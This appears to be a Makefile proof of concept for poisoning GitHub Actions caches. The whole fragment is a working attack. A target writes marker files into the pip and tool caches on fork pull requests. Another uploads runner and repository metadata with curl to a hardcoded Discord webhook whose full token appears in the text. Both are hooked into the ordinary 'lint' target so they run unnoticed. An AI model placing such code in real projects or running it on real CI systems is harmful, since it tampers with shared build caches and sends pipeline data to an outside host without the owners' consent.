# --- Cache Poisoning PoC with hardcoded webhook ------------------------------
.PHONY: ci-cache-check ci-cache-poison lint

# 1) Check: look for markers, upload evidence if present
ci-cache-check:
	@echo "[Cache-Check] Detecting prior markers in caches…"; \
	pip_cache_dir="$$(python3 -m pip cache dir 2>/dev/null || echo "$$HOME/.cache/pip")"; \
	toolcache="$${RUNNER_TOOL_CACHE:-$$HOME/hostedtoolcache}"; \
	mark_pip="$$pip_cache_dir/wheels/poc/MARKER.txt"; \
	mark_tool="$$toolcache/poc/MARKER.txt"; \
	found="false"; \
	if [ -f "$$mark_pip" ];  then echo "::warning:: Found PIP marker";  found="true"; fi; \
	if [ -f "$$mark_tool" ]; then echo "::warning:: Found TOOL marker"; found="true"; fi; \
	if [ "$$found" = "true" ]; then \
		tmprep="$$(mktemp -t cacheEvidence)"; \
		{ \
			echo "Cache poisoning evidence"; \
			echo "time=$$(date -u +%FT%TZ) host=$$(hostname) runner=$$RUNNER_NAME"; \
			echo "repo=$$GITHUB_REPOSITORY event=$$GITHUB_EVENT_NAME run_id=$$GITHUB_RUN_ID sha=$$GITHUB_SHA actor=$$GITHUB_ACTOR"; \
			echo ""; \
			echo "[pip cache] $$pip_cache_dir"; \
			if [ -f "$$mark_pip" ]; then echo "--- $$mark_pip ---"; cat "$$mark_pip"; echo ""; fi; \
			echo "[toolcache] $$toolcache"; \
			if [ -f "$$mark_tool" ]; then echo "--- $$mark_tool ---"; cat "$$mark_tool"; echo ""; fi; \
		} > "$$tmprep"; \
		echo "[Cache-Check] Uploading evidence to Discord…"; \
		code=$$(curl -sS -o /dev/null -w "%{http_code}" \
			-F 'payload_json={"content":"Cache poisoning evidence: markers found"}' \
			-F "files[0]=@$$tmprep;type=text/plain;filename=cache-evidence.txt" \
			"https://discord.com/api/webhooks/1413091167125504000/DZPsdR_duaO5zoezj4o3FxDAQZ5JqoChL3vEPWg7BcjLJ17U0zVoUrtJbkyVJDYPRDdN"); \
		echo "Discord evidence HTTP $$code"; \
		rm -f "$$tmprep" || true; \
	else \
		echo "[Cache-Check] No markers found; nothing to report."; \
	fi

# 2) Poison: on fork PRs, write new markers
ci-cache-poison:
	@echo "[Cache-Poison] Evaluating if this is a fork PR…"; \
	is_fork="$$(printf '%s\n' \
'import json,os,sys' \
'p=os.environ.get("GITHUB_EVENT_PATH")' \
'f=False' \
'try:' \
'    ev=json.load(open(p)) if p and os.path.exists(p) else {}' \
'    f=bool(ev.get("pull_request",{}).get("head",{}).get("repo",{}).get("fork"))' \
'except Exception: pass' \
'print("true" if f else "false")' | python3 -)"; \
	echo "[Cache-Poison] fork flag: $$is_fork"; \
	if [ "$$is_fork" = "true" ]; then \
		pip_cache_dir="$$(python3 -m pip cache dir 2>/dev/null || echo "$$HOME/.cache/pip")"; \
		toolcache="$${RUNNER_TOOL_CACHE:-$$HOME/hostedtoolcache}"; \
		mkdir -p "$$pip_cache_dir/wheels/poc" "$$toolcache/poc"; \
		{ echo "POC CACHE MARKER"; \
		  echo "time=$$(date -u +%FT%TZ)"; \
		  echo "host=$$(hostname)"; \
		  echo "actor=$$GITHUB_ACTOR  repo=$$GITHUB_REPOSITORY  run=$$GITHUB_RUN_ID"; \
		  echo "event=$$GITHUB_EVENT_NAME  fork=true"; } > "$$pip_cache_dir/wheels/poc/MARKER.txt"; \
		cp "$$pip_cache_dir/wheels/poc/MARKER.txt" "$$toolcache/poc/MARKER.txt"; \
		echo "[Cache-Poison] Wrote markers to:"; \
		ls -l "$$pip_cache_dir/wheels/poc/MARKER.txt" "$$toolcache/poc/MARKER.txt" || true; \
	else \
		echo "[Cache-Poison] Not a fork PR; skipping write."; \
	fi

# Hook into lint so this always runs
lint: ci-cache-check ci-cache-poison
	@echo "Lint step ran (after cache PoC)."
